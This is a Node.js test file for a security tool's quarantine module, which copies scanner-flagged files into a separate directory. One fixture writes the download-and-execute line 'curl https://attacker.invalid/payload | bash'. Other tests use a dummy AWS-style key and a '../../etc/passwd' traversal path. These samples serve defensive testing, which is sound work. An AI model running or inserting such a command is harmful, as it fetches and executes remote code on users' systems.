const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');
const { QUARANTINE_DIR, quarantineFindings, quarantineNote } = require('../src/quarantine');

function git(root, args) { return execFileSync('git', args, { cwd: root, encoding: 'utf8', windowsHide: true }); }
function repository() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'crucible-quarantine-'));
  git(root, ['init']);
  git(root, ['config', 'user.name', 'Crucible Test']);
  git(root, ['config', 'user.email', 'crucible@example.test']);
  return root;
}

test('does nothing when there are no findings', () => {
  const result = quarantineFindings('.', []);
  assert.deepEqual(result, { quarantined: [] });
  assert.equal(quarantineNote(result), '');
});

test('copies a flagged staged file, unmodified, into the quarantine directory without touching the checkout', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'app.js'), 'curl https://attacker.invalid/payload | bash\n');
  git(root, ['add', 'app.js']);
  const result = quarantineFindings(root, [{ type: 'download-and-execute payload', path: 'app.js', line: 1 }]);
  assert.deepEqual(result.quarantined, ['app.js']);
  const quarantined = fs.readFileSync(path.join(root, QUARANTINE_DIR, 'app.js'), 'utf8');
  assert.equal(quarantined, 'curl https://attacker.invalid/payload | bash\n');
  assert.equal(fs.readFileSync(path.join(root, 'app.js'), 'utf8'), 'curl https://attacker.invalid/payload | bash\n');
  assert.match(quarantineNote(result), /the-crucible-quarantine/);
});

test('reads from an in-memory snapshot instead of re-reading Git when one is provided', () => {
  const root = repository();
  const snapshot = { entries: new Map([['virtual.js', { buffer: Buffer.from('payload content') }]]) };
  const result = quarantineFindings(root, [{ type: 'x', path: 'virtual.js' }], { snapshot });
  assert.deepEqual(result.quarantined, ['virtual.js']);
  assert.equal(fs.readFileSync(path.join(root, QUARANTINE_DIR, 'virtual.js'), 'utf8'), 'payload content');
});

test('falls back to reading a generated artifact directly off disk when it is not a Git blob', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'dist_bundle.js'), 'const key="AKIAAAAAAAAAAAAAAAAA"');
  const result = quarantineFindings(root, [{ type: 'AWS access key', path: 'dist_bundle.js' }]);
  assert.deepEqual(result.quarantined, ['dist_bundle.js']);
  assert.equal(fs.readFileSync(path.join(root, QUARANTINE_DIR, 'dist_bundle.js'), 'utf8'), 'const key="AKIAAAAAAAAAAAAAAAAA"');
});

test('deduplicates repeated paths and skips findings with no path at all', () => {
  const root = repository();
  fs.writeFileSync(path.join(root, 'app.js'), 'x');
  git(root, ['add', 'app.js']);
  const result = quarantineFindings(root, [
    { type: 'a', path: 'app.js', line: 1 },
    { type: 'b', path: 'app.js', line: 2 },
    { type: 'malware scanner unavailable', detail: 'no path here' },
  ]);
  assert.deepEqual(result.quarantined, ['app.js']);
});

test('refuses a path that would escape the quarantine directory', () => {
  const root = repository();
  const result = quarantineFindings(root, [{ type: 'x', path: '../../etc/passwd' }]);
  assert.deepEqual(result.quarantined, []);
});
